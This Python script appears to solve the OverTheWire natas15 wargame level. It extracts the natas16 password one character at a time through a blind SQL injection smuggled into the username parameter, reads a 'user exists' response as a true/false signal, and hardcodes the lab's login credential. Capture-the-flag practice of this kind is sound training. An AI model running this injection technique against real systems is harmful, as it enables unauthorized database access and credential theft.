import requests
from string import digits, ascii_lowercase, ascii_uppercase


url="http://natas15.natas.labs.overthewire.org/index.php"
chars = ascii_lowercase + ascii_uppercase + digits
pw = ""
user_exists = "This user exists"

pw_len = len("AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

for i in range(pw_len):
    for curr_char in chars:
        curr_pass = pw + curr_char
        print("trying password: " + curr_pass)
        params = (('username', 'natas16" and password like binary"' + curr_pass + '%" #'), ("debug", "true"))
        s = requests.Session()
        s.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
        r = s.get(url, params=params)
        #print(r.text)
        if user_exists in r.text:
            pw = curr_pass
            print("current password: " + curr_pass)
            break